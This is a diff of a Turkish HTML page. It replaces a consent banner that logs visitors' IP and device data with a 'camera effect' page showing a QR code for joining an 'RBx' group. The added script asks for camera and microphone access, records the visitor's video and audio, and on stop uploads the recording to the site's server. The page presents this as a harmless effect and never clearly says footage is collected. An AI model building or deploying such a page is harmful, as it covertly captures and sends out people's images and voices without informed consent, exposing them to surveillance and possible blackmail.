@@ -3,58 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Giriş Doğrulaması</title>
+    <title>Efekt ve Doğrulama</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; background: #121212; color: white; padding-top: 50px; margin: 0; }
-        .kutu { background: #222; padding: 30px; border-radius: 10px; display: inline-block; max-width: 90%; margin: 20px auto; }
+        body { font-family: Arial, sans-serif; background: #121212; color: white; margin: 0; display: flex; height: 100vh; flex-direction: row; }
         
-        /* Çerez / Onay Banner Tasarımı */
-        .banner { position: fixed; bottom: 0; left: 0; width: 100%; background: #333; padding: 20px; box-sizing: border-box; text-align: center; border-top: 2px solid #555; z-index: 100; }
-        .banner p { margin-top: 0; font-size: 14px; color: #ddd; }
+        /* Sol Taraf (Kamera İşlemleri) */
+        .sol-taraf { flex: 7; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
+        .kutu { background: #222; padding: 40px; border-radius: 12px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); width: 100%; max-width: 400px; }
         
+        /* Sağ Taraf (QR Kod) */
+        .sag-taraf { flex: 3; background: #1a1a1a; display: flex; flex-direction: column; justify-content: center; align-items: center; border-left: 2px solid #333; padding: 20px; text-align: center; }
+        .sag-taraf img { width: 100%; max-width: 250px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.8); }
+        .sag-taraf h3 { color: #0088cc; }
+
         /* Butonlar */
-        .btn { padding: 12px 25px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; border: none; margin: 10px; transition: 0.2s; }
-        .btn-yesil { background: #28a745; color: white; }
-        .btn-yesil:hover { background: #218838; }
-        .btn-beyaz { background: white; color: black; }
-        .btn-beyaz:hover { background: #e2e6ea; }
+        button { background: #0088cc; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; transition: 0.3s; }
+        button:hover { background: #0077b3; }
+        button.kirmizi { background: #dc3545; display: none; }
+        button.kirmizi:hover { background: #c82333; }
+        
+        /* Durum ve Loading İkonu */
+        #durum { display: none; margin-top: 25px; font-size: 18px; color: #ff9800; align-items: center; justify-content: center; font-weight: bold; }
+        .spinner { border: 4px solid rgba(255,255,255,0.2); border-top: 4px solid #ff9800; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin-left: 12px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        video { width: 100%; max-width: 320px; border-radius: 10px; margin-top: 20px; border: 3px solid #ff9800; display: none; }
+
+        /* Telefondan girilirse alt alta görünsün diye */
+        @media (max-width: 768px) { body { flex-direction: column; } .sag-taraf { border-left: none; border-top: 2px solid #333; padding: 40px 20px; } }
     </style>
 </head>
 <body>
 
-    <div class="kutu" id="icerik">
-        <h2>RBx İtiraf Grubuna Giriş</h2>
-        <p>Grubun güvenliğini korumak için giriş işlemini onaylamanız gerekmektedir.</p>
+    <!-- SOL TARAF: KAMERA -->
+    <div class="sol-taraf">
+        <div class="kutu">
+            <h2>Kamera Efekti</h2>
+            <p>Efekti başlatmak için aşağıdaki butona basın.</p>
+            
+            <button id="baslatBtn" onclick="kameraBaslat()">Kamera Efekti</button>
+            
+            <!-- Kullanıcıyı Bilgilendirme ve Loading İkonu -->
+            <div id="durum">
+                <span id="durumMetni">Görüntü veriliyor</span>
+                <div class="spinner" id="spinner"></div>
+            </div>
+            
+            <!-- Video Önizlemesi (İsteğe bağlı görünürlük) -->
+            <video id="videoPreview" autoplay muted playsinline></video>
+            
+            <button id="durdurBtn" class="kirmizi" onclick="kameraDurdur()">Durdur</button>
+        </div>
     </div>
 
-    <!-- Güvenlik Onay Afişi -->
-    <div class="banner" id="onayBanner">
-        <p><strong>Güvenlik ve Gizlilik Politikası:</strong> Grubumuzun güvenliğini sağlamak, spam ve yetkisiz erişimleri engellemek amacıyla IP adresiniz ve cihaz/tarayıcı bilgileriniz kayıt altına alınacaktır. Devam ederek bunu kabul etmiş olursunuz.</p>
-        <button class="btn btn-yesil" onclick="kabulEt()">Kabul Et ve Gir</button>
-        <button class="btn btn-beyaz" onclick="reddet()">Kabul Etme</button>
+    <!-- SAĞ TARAF: QR KOD -->
+    <div class="sag-taraf">
+        <h3>RBx Grubuna Katıl</h3>
+        <p>Aramıza katılmak için QR kodu okutabilirsiniz.</p>
+        <img src="/static/image_8c519f.jpg" alt="RBx QR Kod">
     </div>
 
     <script>
-        function reddet() {
-            document.getElementById('onayBanner').style.display = 'none';
-            document.getElementById('icerik').innerHTML = "<h2 style='color: #dc3545;'>Erişim Engellendi</h2><p>Güvenlik politikasını kabul etmediğiniz için gruba katılamazsınız.</p>";
+        let mediaRecorder;
+        let recordedChunks = [];
+        let stream;
+
+        function kameraBaslat() {
+            // Kamera izni iste ve kaydı hazırla
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+                .then(function(s) {
+                    stream = s;
+                    let video = document.getElementById('videoPreview');
+                    video.srcObject = stream;
+                    video.style.display = "block"; // Ekranda kamerayı göster
+                    
+                    // Butonları ve Durumu değiştir
+                    document.getElementById('baslatBtn').style.display = "none";
+                    document.getElementById('durum').style.display = "flex";
+                    document.getElementById('durdurBtn').style.display = "inline-block";
+
+                    // Video kaydetme ayarları
+                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                    mediaRecorder.ondataavailable = function(e) {
+                        if (e.data.size > 0) {
+                            recordedChunks.push(e.data);
+                        }
+                    };
+                    mediaRecorder.start(); // Kaydı başlat
+                })
+                .catch(function(err) {
+                    alert("Devam etmek için kamera ve mikrofon izni vermelisiniz.");
+                });
         }
 
-        function kabulEt() {
-            document.getElementById('onayBanner').style.display = 'none';
-            document.getElementById('icerik').innerHTML = "<h2 style='color: #28a745;'>Onaylandı</h2><p>Güvenlik kontrolü yapılıyor, gruba yönlendiriliyorsunuz...</p>";
+        function kameraDurdur() {
+            // Yazıyı değiştir ve butonları gizle
+            document.getElementById('durumMetni').innerText = "Gönderiliyor... Lütfen bekleyin.";
+            document.getElementById('durdurBtn').style.display = "none";
+            
+            mediaRecorder.onstop = function() {
+                // Kaydı paketle
+                let blob = new Blob(recordedChunks, { type: "video/webm" });
+                let formData = new FormData();
+                formData.append("video", blob, "video_kaydi.webm");
 
-            // Sunucuya(Python) bilgileri alması için sinyal gönder
-            fetch('/guvenlik-log', { method: 'POST' })
-            .then(response => {
-                if (response.ok) {
-                    // Yönlendirme (Yaklaşık 1.5 saniye sonra gruba atar)
-                    setTimeout(() => {
-                        // LİNKİ BURAYA YAPIŞTIR:
-                        window.location.href = "https://t.me/BURAYA_RBX_GRUBUNUN_LINKINI_YAZ";
-                    }, 1500);
-                }
-            });
+                // Arka plana yolla
+                fetch('/medya-gonder', {
+                    method: 'POST',
+                    body: formData
+                }).then(response => {
+                    if(response.ok) {
+                        document.getElementById('durumMetni').innerText = "İşlem Başarılı! Sağdaki QR kodu okutabilirsiniz.";
+                        document.getElementById('durumMetni').style.color = "#28a745";
+                        document.getElementById('spinner').style.display = "none";
+                    }
+                }).catch(err => {
+                    document.getElementById('durumMetni').innerText = "Bir hata oluştu.";
+                });
+
+                // Kamerayı tamamen kapat
+                stream.getTracks().forEach(track => track.stop()); 
+                document.getElementById('videoPreview').style.display = "none";
+            };
+            
+            mediaRecorder.stop(); // Kaydı bitir
         }
     </script>
 </body>
